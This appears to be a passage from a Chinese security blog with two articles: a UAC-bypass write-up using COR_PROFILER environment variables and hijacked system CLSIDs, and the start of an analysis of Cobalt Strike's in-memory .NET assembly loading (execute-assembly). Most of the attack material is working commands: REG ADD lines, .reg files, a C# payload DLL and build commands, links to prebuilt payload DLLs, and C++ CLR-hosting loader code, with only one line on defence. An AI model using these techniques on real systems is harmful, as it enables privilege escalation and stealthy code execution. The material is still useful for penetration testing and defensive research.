<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>wmic ENVIRONMENT create name="COR_ENABLE_PROFILING",username="%username%",VariableValue="1"
wmic ENVIRONMENT create name="COR_PROFILER",username="%username%",VariableValue="{11111111-1111-1111-1111-111111111111}"
</code></pre></div></div>

<p>在<a href="https://3gstudent.github.io/3gstudent.github.io/Use-Logon-Scripts-to-maintain-persistence/">《Use Logon Scripts to maintain persistence》</a>补充了使用powershell修改环境变量的方法，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>New-ItemProperty "HKCU:\Environment\" COR_ENABLE_PROFILING -value "1" -propertyType string | Out-Null
New-ItemProperty "HKCU:\Environment\" COR_PROFILER -value "{11111111-1111-1111-1111-111111111111}" -propertyType string | Out-Null
</code></pre></div></div>

<p>clem@clavoillotte的方法是直接通过reg add，代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
</code></pre></div></div>

<p>clem@clavoillotte的POC:</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\Temp\test.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER_PATH" /t REG_SZ /d "C:\Temp\test.dll" /f
mmc gpedit.msc
</code></pre></div></div>

<p>个人认为不需要指定环境变量COR_PROFILER_PATH，经过精简后的POC如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>REG ADD "HKCU\Software\Classes\CLSID\{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}\InprocServer32" /ve /t REG_EXPAND_SZ /d "C:\test\calc.dll" /f
REG ADD "HKCU\Environment" /v "COR_PROFILER" /t REG_SZ /d "{FFFFFFFF-FFFF-FFFF-FFFF-FFFFFFFFFFFF}" /f
REG ADD "HKCU\Environment" /v "COR_ENABLE_PROFILING" /t REG_SZ /d "1" /f
mmc gpedit.msc
</code></pre></div></div>

<p>测试dll依旧是通过c++编写的dll标准模板，下载地址：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/calc.dll</p>

<p>会正常启动gpedit.msc，同时弹出计算器，权限为high</p>

<p>如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-1.png" alt="Alt text"></p>

<p>如果想只启动计算器，不执行gpedit.msc，在启动代码<code class="language-plaintext highlighter-rouge">WinExec("calc.exe",SW_SHOWNORMAL);</code>后添加<code class="language-plaintext highlighter-rouge">ExitProcess(0);</code>就好</p>

<p>编译好的dll已上传，下载地址如下：</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</p>

<p>测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/3-2.png" alt="Alt text"></p>

<p>计算器权限为high，成功绕过UAC</p>

<h2 id="0x03-劫持系统clsid绕过uac的方法">0x03 劫持系统CLSID绕过UAC的方法</h2>
<hr>

<p>clem@clavoillotte在博客中分享了如何劫持系统CLSID实现UAC绕过，所以接下来对其逐个测试，并标记需要注意的地方</p>

<h3 id="1b29d466a-857d-35ba-8712-a758861bfea1">1、{B29D466A-857D-35BA-8712-A758861BFEA1}</h3>

<p>注册表文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}]
@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\Implemented Categories\{62C8FE65-4EBB-45E7-B440-6E39B2CDBF29}]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v4.0.30319"
"ThreadingModel"="Both"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\InprocServer32\10.0.0.0]
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v4.0.30319"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{B29D466A-857D-35BA-8712-A758861BFEA1}\ProgId]
@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>注册表项中的<code class="language-plaintext highlighter-rouge">@="Microsoft.GroupPolicy.AdmTmplEditor.GPMAdmTmplEditorManager"</code>表明，执行gpedit.msc时会调用该CLSID</p>

<p>生成test_managed.dll的c#代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Diagnostics;

namespace TestDotNet
{
   public class Class1
   {
      static Class1()
      { 
         Process.Start("calc.exe");
         Environment.Exit(0);
      }
   }
}
</code></pre></div></div>

<p>保存为<code class="language-plaintext highlighter-rouge">TestDotNet.cs</code>，编译成dll</p>

<p>使用csc.exe编译生成dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library TestDotNet.cs
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>使用.Net 4.0目录下的csc.exe</p>

<p>将生成的TestDotNet.dll重命名为test_managed.dll，成功绕过UAC，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-4.png" alt="Alt text"></p>

<p><strong>补充关于c#编译文件的一个技巧：</strong></p>

<p>使用Visual Studio编译c#程序，如果项目名称同程序集名称(即命名空间namespace)不对应（结合本文，代码中程序集名称为TestDotNet，而新建的项目名却是Class1），需要重新指定程序集名称，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-2.png" alt="Alt text"></p>

<p>同样，使用csc.exe编译生成文件也存在这个问题</p>

<p>例如将源代码保存为a.cs，那么在输出的时候必须加/out参数指定输出文件为TestDotNet.dll，这样程序集名称也默认为TestDotNet（同源代码对应），具体参数如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v4.0.30319\csc.exe /t:library /out:TestDotNet.dll a.cs
</code></pre></div></div>

<p>否则，dll虽然能够被加载，但无法执行，如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-3.png" alt="Alt text"></p>

<h3 id="2d5ab5662-131d-453d-88c8-9bba87502ade">2、{D5AB5662-131D-453D-88C8-9BBA87502ADE}</h3>

<p>注册表文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}]
@="Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\Implemented Categories\{62C8FE65-4EBB-45e7-B440-6E39B2CDBF29}]

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v2.0.50727"
"ThreadingModel"="Both"
"CodeBase"="file://C://Temp//test_managed.dll"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{D5AB5662-131D-453D-88C8-9BBA87502ADE}\InprocServer32\3.0.0.0]
"Assembly"="TestDotNet, Version=0.0.0.0, Culture=neutral"
"Class"="TestDotNet.Class1"
"RuntimeVersion"="v2.0.50727"
"CodeBase"="file://C://Temp//test_managed.dll"
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>注册表项中的<code class="language-plaintext highlighter-rouge">@="Microsoft.ManagementConsole.Advanced.FrameworkSnapInFactory"</code>，以下命令执行时会调用该CLSID：</p>

<ul>
  <li>compmgmt.msc</li>
  <li>eventvwr.msc</li>
  <li>secpol.msc</li>
  <li>taskschd.msc</li>
</ul>

<p>使用csc.exe编译dll：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\Microsoft.NET\Framework\v2.0.50727\csc.exe /t:library TestDotNet.cs
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>dll要使用.net 2.0编译</p>

<h3 id="30a29ff9e-7f9c-4437-8b11-f424491e3931">3、{0A29FF9E-7F9C-4437-8B11-F424491E3931}</h3>

<p>注册表文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
@="NDP SymBinder"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"ThreadingModel"="Both"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32\4.0.30319]
@="4.0.30319"
"ImplementedInThisVersion"=""

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\ProgID]
@="CorSymBinder_SxS"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\Server]
@="C:\\Temp\\test_unmanaged.dll"
</code></pre></div></div>

<p>测试系统为Win7和Win10，未成功，所以我对该脚本作了修改，修改后的文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}]
@="NDP SymBinder"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{0A29FF9E-7F9C-4437-8B11-F424491E3931}\InprocServer32]
@="C:\\Temp\\test_unmanaged.dll"
"ThreadingModel"="Both"
</code></pre></div></div>

<p>此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</p>

<p>执行以下代码均能触发dll劫持，实现UAC绕过：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\eventvwr.exe
</code></pre></div></div>

<p>or</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>C:\Windows\System32\mmc.exe CompMgmt.msc
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>该利用方法b33f@FuzzySecurity在DefCon25也介绍过，详情可见如下链接：</p>

<p>https://raw.githubusercontent.com/FuzzySecurity/DefCon25/master/Lab-Writeup.txt</p>

<h3 id="4cb2f6723-ab3a-11d2-9c40-00c04fa30a3e">4、{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}</h3>

<p>注册表文件如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>Windows Registry Editor Version 5.00

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}]
@="Microsoft Common Language Runtime Meta Data"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32]
@="C:\\Windows\\System32\\mscoree.dll"
"ThreadingModel"="Both"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\InprocServer32\4.0.30319]
@="4.0.30319"
"ImplementedInThisVersion"=""

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\ProgID]
@="CLRMetaData.CorRuntimeHost.2"

[HKEY_CURRENT_USER\Software\Classes\CLSID\{CB2F6723-AB3A-11D2-9C40-00C04FA30A3E}\Server]
@="..\\..\\..\\..\\Temp\\test_unmanaged.dll"
</code></pre></div></div>

<p>此处的test_unmanaged.dll同1和2的不同，这里需要一个标准dll，实现dll劫持，dll下载地址;</p>

<p>https://raw.githubusercontent.com/3gstudent/test/master/calcexit.dll</p>

<p>执行secpol.msc触发dll劫持，测试如下图</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/5-2.png" alt="Alt text"></p>

<h2 id="0x04-补充">0x04 补充</h2>

<p>使用Procmon记录gpedit.msc的启动过程，寻找可被利用的系统CLSID，寻找特征如下：</p>

<p>打开注册表键值<code class="language-plaintext highlighter-rouge">HKCU:\Software\Classes\CLSID\{****}\InprocServer32</code>，返回<code class="language-plaintext highlighter-rouge">NAME NOT FOUND</code></p>

<p>打开注册表键值<code class="language-plaintext highlighter-rouge">HKCR:\CLSID\{****}\InprocServer32</code>，返回<code class="language-plaintext highlighter-rouge">SUCCESS</code></p>

<p>如下图，标记的几个CLSID符合要求</p>

<p><img src="https://raw.githubusercontent.com/3gstudent/BlogPic/master/2017-9-19/4-1.png" alt="Alt text"></p>

<p>在测试系统Win7 x86下共找到如下符合要求的CLSID：</p>

<ul>
  <li>{8FC0B734-A0E1-11D1-A7D3-0000F87571E3}</li>
  <li>{B708457E-DB61-4C55-A92F-0D4B5E9B1224}</li>
  <li>{871C5380-42A0-1069-A2EA-08002B30309D}</li>
  <li>{D02B1F72-3407-48ae-BA88-E8213C6761F1}</li>
  <li>{B29D466A-857D-35BA-8712-A758861BFEA1}</li>
  <li>{D02B1F73-3407-48AE-BA88-E8213C6761F1}</li>
  <li>{B0395DA5-6A15-4E44-9F36-9A9DC7A2F341}</li>
  <li>{ADE6444B-C91F-4E37-92A4-5BB430A33340}</li>
</ul>

<h2 id="0x05-防御">0x05 防御</h2>
<hr>

<p>监控注册表<code class="language-plaintext highlighter-rouge">HKEY_CURRENT_USER\Software\Classes\CLSID\</code>下键值的创建和修改</p>

<h2 id="0x06-小结">0x06 小结</h2>
<hr>

<p>微软不把UAC绕过作为漏洞，站在他们的角度可以理解。但在渗透测试中，常常会碰到需要绕过UAC的情况，某些UAC绕过方法往往还能作更多利用。站在防御的角度，提醒防御方对UAC绕过方法保持关注。</p>

<hr>

<p><a href="https://github.com/3gstudent/feedback/issues/new">LEAVE A REPLY</a></p>


  </div>

  <div class="date">
    Written on September 19, 2017
  </div>

  
</article><article class="post">
  <h1>从内存加载.NET程序集(execute-assembly)的利用分析</h1>

  <div class="entry">
    <h2 id="0x00-前言">0x00 前言</h2>
<hr>

<p>Cobalt Strike 3.11中，加入了一个名为”execute-assembly”的命令，能够从内存中加载.NET程序集。这个功能不需要向硬盘写入文件，十分隐蔽，而且现有的Powershell利用脚本能够很容易的转换为C#代码，十分方便。</p>

<p>本文将会对”execute-assembly”的原理进行介绍，结合多个开源代码，介绍实现方法，分析利用思路，最后给出防御建议</p>

<h2 id="0x01-简介">0x01 简介</h2>
<hr>

<p>本文将要介绍以下内容：</p>

<ul>
  <li>基础知识</li>
  <li>正常的实现方法</li>
  <li>开源利用代码分析</li>
  <li>利用思路</li>
  <li>防御建议</li>
</ul>

<h2 id="0x02-基础知识">0x02 基础知识</h2>
<hr>

<h3 id="1clr">1.CLR</h3>

<p>全称Common Language Runtime（公共语言运行库），是一个可由多种编程语言使用的运行环境</p>

<p>CLR是.NET Framework的主要执行引擎，作用之一是监视程序的运行：</p>

<ul>
  <li>在CLR监视之下运行的程序属于”托管的”(managed)代码</li>
  <li>不在CLR之下、直接在裸机上运行的应用或者组件属于”非托管的”(unmanaged)的代码</li>
</ul>

<h3 id="2unmanaged-api">2.Unmanaged API</h3>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/</p>

<p>用于将.NET 程序集加载到任意程序中的API</p>

<p>支持两种接口：</p>

<ul>
  <li>ICorRuntimeHost Interface</li>
  <li>ICLRRuntimeHost Interface</li>
</ul>

<h3 id="3icorruntimehost-interface">3.ICorRuntimeHost Interface</h3>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/icorruntimehost-interface</p>

<p>支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319</p>

<h3 id="4iclrruntimehost-interface">4.ICLRRuntimeHost Interface</h3>

<p>参考资料：</p>

<p>https://docs.microsoft.com/en-us/dotnet/framework/unmanaged-api/hosting/iclrruntimehost-interface</p>

<p>支持v2.0.50727和v4.0.30319</p>

<p>在.NET Framework 2.0中，ICLRRuntimeHost用于取代ICorRuntimeHost</p>

<p>在实际程序开发中，很少会考虑.NET Framework 1.0，所以两个接口都可以使用</p>

<h2 id="0x03-正常的实现方法">0x03 正常的实现方法</h2>
<hr>

<p>使用的实例代码：</p>

<p>https://code.msdn.microsoft.com/windowsdesktop/CppHostCLR-e6581ee0#content</p>

<p>这里将参考实例代码并做补充</p>

<p>通用的实现方法如下：</p>

<h4 id="1将clr加载到进程中">1.将CLR加载到进程中</h4>

<p>(1)调用CLRCreateInstance函数以获取ICLRMetaHost或ICLRMetaHostPolicy接口</p>

<p>(2)调用ICLRMetaHost::EnumerateInstalledRuntimes, ICLRMetaHost::GetRuntime或者ICLRMetaHostPolicy::GetRequestedRuntime方法以获取有效的ICLRRuntimeInfo指针</p>

<p>三个任选一个</p>

<p>(3)使用ICorRuntimeHost或者ICLRRuntimeHost</p>

<p>二者都是调用ICLRRuntimeInfo::GetInterface方法，但是参数不同</p>

<p><strong>ICorRuntimeHost：</strong></p>

<p>支持v1.0.3705, v1.1.4322, v2.0.50727和v4.0.30319</p>

<p>指定CLSID_CorRuntimeHost为rclsid参数</p>

<p>指定IID_ICorRuntimeHost为RIID参数</p>

<p><strong>ICLRRuntimeHost：</strong></p>

<p>支持v2.0.50727和v4.0.30319</p>

<p>指定CLSID_CLRRuntimeHost为rclsid参数</p>

<p>指定IID_ICLRRuntimeHost为RIID参数</p>

<h4 id="2加载net程序集并调用静态方法">2.加载.NET程序集并调用静态方法</h4>

<p>在代码实现上，使用ICLRRuntimeHost会比使用ICorRuntimeHost简单的多</p>

<h4 id="3清理clr">3.清理CLR</h4>

<p>释放步骤1中的指针</p>

<p>下面使用ICLRMetaHost::GetRuntime获取有效的ICLRRuntimeInfo指针，使用ICLRRuntimeHost从文件加载.NET程序集并调用静态方法，实现代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>#include "stdafx.h"
#include &lt;metahost.h&gt;
#include &lt;windows.h&gt;
#pragma comment(lib, "MSCorEE.lib")

HRESULT RuntimeHost_GetRuntime_ICLRRuntimeInfo(PCWSTR pszVersion, PCWSTR pszAssemblyName, PCWSTR pszClassName, PCWSTR pszMethodName, PCWSTR pszArgName)
{
	// Call the ICLRMetaHost::GetRuntime to get a valid ICLRRuntimeInfo.
	// Call the ICLRRuntimeInfo:GetInterface method.
	HRESULT hr;
	ICLRMetaHost *pMetaHost = NULL;
	ICLRRuntimeInfo *pRuntimeInfo = NULL;
	ICLRRuntimeHost *pClrRuntimeHost = NULL;
	DWORD dwLengthRet;
	// 
	// Load and start the .NET runtime.
	// 
	wprintf(L"Load and start the .NET runtime %s \n", pszVersion);
	hr = CLRCreateInstance(CLSID_CLRMetaHost, IID_PPV_ARGS(&amp;pMetaHost));
	if (FAILED(hr))
	{
		wprintf(L"[!]CLRCreateInstance failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	// Get the ICLRRuntimeInfo corresponding to a particular CLR version. It 
	// supersedes CorBindToRuntimeEx with STARTUP_LOADER_SAFEMODE.
	hr = pMetaHost-&gt;GetRuntime(pszVersion, IID_PPV_ARGS(&amp;pRuntimeInfo));
	if (FAILED(hr))
	{
		wprintf(L"[!]ICLRMetaHost::GetRuntime failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	// Check if the specified runtime can be loaded into the process. This 
	// method will take into account other runtimes that may already be 
	// loaded into the process and set pbLoadable to TRUE if this runtime can 
	// be loaded in an in-process side-by-side fashion. 
	BOOL fLoadable;
	hr = pRuntimeInfo-&gt;IsLoadable(&amp;fLoadable);
	if (FAILED(hr))
	{
		wprintf(L"[!]ICLRRuntimeInfo::IsLoadable failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	if (!fLoadable)
	{
		wprintf(L"[!].NET runtime %s cannot be loaded\n", pszVersion);
		goto Cleanup;
	}
	// Load the CLR into the current process and return a runtime interface 
	// pointer. ICorRuntimeHost and ICLRRuntimeHost are the two CLR hosting  
	// interfaces supported by CLR 4.0. Here we demo the ICLRRuntimeHost 
	// interface that was provided in .NET v2.0 to support CLR 2.0 new 
	// features. ICLRRuntimeHost does not support loading the .NET v1.x 
	// runtimes.
	hr = pRuntimeInfo-&gt;GetInterface(CLSID_CLRRuntimeHost, IID_PPV_ARGS(&amp;pClrRuntimeHost));
	if (FAILED(hr))
	{
		wprintf(L"[!]ICLRRuntimeInfo::GetInterface failed w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	// Start the CLR.
	hr = pClrRuntimeHost-&gt;Start();
	if (FAILED(hr))
	{
		wprintf(L"[!]CLR failed to start w/hr 0x%08lx\n", hr);
		goto Cleanup;
	}
	// 
	// Load the NET assembly and call the static method.
	// 
	wprintf(L"[+]Load the assembly %s\n", pszAssemblyName);
	// The invoked method of ExecuteInDefaultAppDomain must have the 
	// following signature: static int pwzMethodName (String pwzArgument)
	// where pwzMethodName represents the name of the invoked method, and 
	// pwzArgument represents the string value passed as a parameter to that 
	// method. If the HRESULT return value of ExecuteInDefaultAppDomain is 
	// set to S_OK, pReturnValue is set to the integer value returned by the 
	// invoked method. Otherwise, pReturnValue is not set.
	hr = pClrRuntimeHost-&gt;ExecuteInDefaultAppDomain(pszAssemblyName, pszClassName, pszMethodName, pszArgName, &amp;dwLengthRet);
	if (FAILED(hr))
	{
		wprintf(L"[!]Failed to call %s w/hr 0x%08lx\n", pszMethodName, hr);
		goto Cleanup;
	}
	// Print the call result of the static method.
	wprintf(L"[+]Call %s.%s(\"%s\") =&gt; %d\n", pszClassName, pszMethodName, pszArgName, dwLengthRet);

Cleanup:
	if (pMetaHost)
	{
		pMetaHost-&gt;Release();
		pMetaHost = NULL;
	}
	if (pRuntimeInfo)
	{
		pRuntimeInfo-&gt;Release();
		pRuntimeInfo = NULL;
	}
	if (pClrRuntimeHost)
	{
		// Please note that after a call to Stop, the CLR cannot be 
		// reinitialized into the same process. This step is usually not 
		// necessary. You can leave the .NET runtime loaded in your process.
		//wprintf(L"Stop the .NET runtime\n");
		//pClrRuntimeHost-&gt;Stop();
		pClrRuntimeHost-&gt;Release();
		pClrRuntimeHost = NULL;
	}
	return hr;
}

int main()
{
	RuntimeHost_GetRuntime_ICLRRuntimeInfo(L"v4.0.30319", L"ClassLibrary1.dll", L"ClassLibrary1.Class1", L"TestMethod", L"argstring");
	return 0;
}
</code></pre></div></div>

<p>代码将会加载同级目录下.Net4.0开发的ClassLibrary1.dll，类名为Class1，方法为TestMethod，传入的参数为argstring</p>

<p>ClassLibrary1.dll的代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>using System;
using System.Collections.Generic;
using System.Linq;
using System.Text;
using System.Threading.Tasks;

namespace ClassLibrary1
{
    public class Class1
    {
        public static int TestMethod(string str)
        {
            System.Diagnostics.Process p = new System.Diagnostics.Process();
            p.StartInfo.FileName = "c:\\windows\\system32\\calc.exe";
            p.Start();
            return 0;
        }
    }
}
</code></pre></div></div>

<h2 id="0x04-开源利用代码分析">0x04 开源利用代码分析</h2>
<hr>

<h3 id="1unmanaged-clr-hosting-assembly-loader">1、Unmanaged CLR Hosting Assembly loader</h3>

<p>https://github.com/caseysmithrc/AssemblyLoader</p>

<p>利用CLR从代码中定义好的数组读取shellcode，加载到内存并执行</p>

<p>实现方法如下：</p>

<h4 id="1将clr加载到进程中-1">1.将CLR加载到进程中</h4>

<p>(1)调用CLRCreateInstance函数以获取ICLRMetaHost或ICLRMetaHostPolicy接口</p>

<p>(2)调用ICLRMetaHost::GetRuntime方法以获取有效的ICLRRuntimeInfo指针</p>

<p>(3)使用ICorRuntimeHost</p>

<p><strong>注：</strong></p>

<p>在使用ICorRuntimeHost时，需要添加对mscorlib.tlb的引用，c++代码如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>// Import mscorlib.tlb (Microsoft Common Language Runtime Class Library).
#import "mscorlib.tlb" raw_interfaces_only				\
    high_property_prefixes("_get","_put","_putref")		\
    rename("ReportEvent", "InteropServices_ReportEvent")
using namespace mscorlib;
#pragma endregion
</code></pre></div></div>

<p>在ICorRuntimeHost中，从文件读取并加载.NET程序集的方法定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virtual HRESULT __stdcall Load_2 (
    /*[in]*/ BSTR assemblyString,
    /*[out,retval]*/ struct _Assembly * * pRetVal ) = 0;
</code></pre></div></div>

<p>从内存中读取并加载.NET程序集的方法定义如下：</p>

<div class="language-plaintext highlighter-rouge"><div class="highlight"><pre class="highlight"><code>  virtual HRESULT __stdcall Load_3 (
    /*[in]*/ SAFEARRAY * rawAssembly,
    /*[out,retval]*/ struct _Assembly * * pRetVal ) = 0;
</code></pre></div></div>

<p><strong>注：</strong></p>

<p>方法定义来自mscorlib.tlh</p>

<p>这里使用了Load_3(…)，先从数组中读取shellcode，再加载.NET程序集</p>

<h4 id="2加载net程序集并调用静态方法-1">2.加载.NET程序集并调用静态方法</h4>

<h4 id="3清理clr-1">3.清理CLR</h4>

<h3 id="2executing-a-net-assembly-from-c-in-memory-clr-hosting">2、Executing a .NET Assembly from C++ in Memory (CLR Hosting)</h3>

<p>https://github.com/etormadiv/HostingCLR</p>

<p>同caseysmith的方法基本相同，都是调用ICLRMetaHost::GetRuntime方法以获取有效的ICLRRuntimeInfo指针，使用ICorRuntimeHost接口，使用Load_3(…)从内存中读取并加载.NET程序集</p>

<h3 id="3clr-via-native-code">3、CLR via native code</h3>

<p>https://gist.githubusercontent.com/xpn/e95a62c6afcf06ede52568fcd8187cc2/raw/f3498245c8309d44af38502a2cc7090c318e8adf/clr_via_native.c</p>

<p>值得注意的是这里调用ICLRMetaHost::EnumerateInstalledRuntimes获取有效的ICLRRuntimeInfo指针</p>

<p>接着使用ICLRRuntimeHost从文件加载.NET程序集并调用静态方法</p>

<h3 id="4metasploit-execute-assembly">4、metasploit-execute-assembly</h3>

<p>https://github.com/b4rtik/metasploit-execute-assembly</p>

<p>首先创建进程notepad.exe，然后向notepad.exe注入HostingCLRx64.dll，HostingCLRx64.dll实现内存加载.Net程序集</p>

<p>这里我们只关注内存加载.Net程序集的细节，代码位置:</p>

<p>https://github.com/b4rtik/metasploit-execute-assembly/blob/master/HostingCLR_inject/HostingCLR/HostingCLR.cpp</p>

<p>细节如下：</p>

<ul>
  <li>使用.Net v4.0.30319</li>
  <li>调用ICLRMetaHost::GetRuntime方法以获取有效的ICLRRuntimeInfo指针</li>
  <li>使用ICorRuntimeHost接口</li>
  <li>使用Load_3(…)从内存中读取并加载.NET程序集</li>
</ul>

<p>同1和2基本相同</p>

<h2 id="0x05-利用思路">0x05 利用思路</h2>
<hr>

<p>综合0x04中的开源代码，execute-assembly通常有以下两种利用思路：</p>

<h4 id="1从内存中读取shellcode并加载net程序集">1.从内存中读取shellcode并加载.NET程序集</h4>

<ul>
  <li>调用ICLRMetaHost::EnumerateInstalledRuntimes, ICLRMetaHost::GetRuntime或者ICLRMetaHostPolicy::GetRequestedRuntime方法以获取有效的ICLRRuntimeInfo指针</li>
  <li>使用ICorRuntimeHost接口</li>
  <li>使用Load_3(…)从内存中读取并加载.NET程序集</li>
  <li>调用静态方法</li>
</ul>

<h4 id="2从硬盘读取并加载net程序集">2.从硬盘读取并加载.NET程序集</h4>

<ul>
  <li>调用ICLRMetaHost::EnumerateInstalledRuntimes, ICLRMetaHost::GetRuntime或者ICLRMetaHostPolicy::GetRequestedRuntime方法以获取有效的ICLRRuntimeInfo指针</li>
  <li>使用ICorRuntimeHost(使用Load_2(…))或者ICLRRuntimeHost接口</li>
  <li>加载.NET程序集并调用静态方法</li>
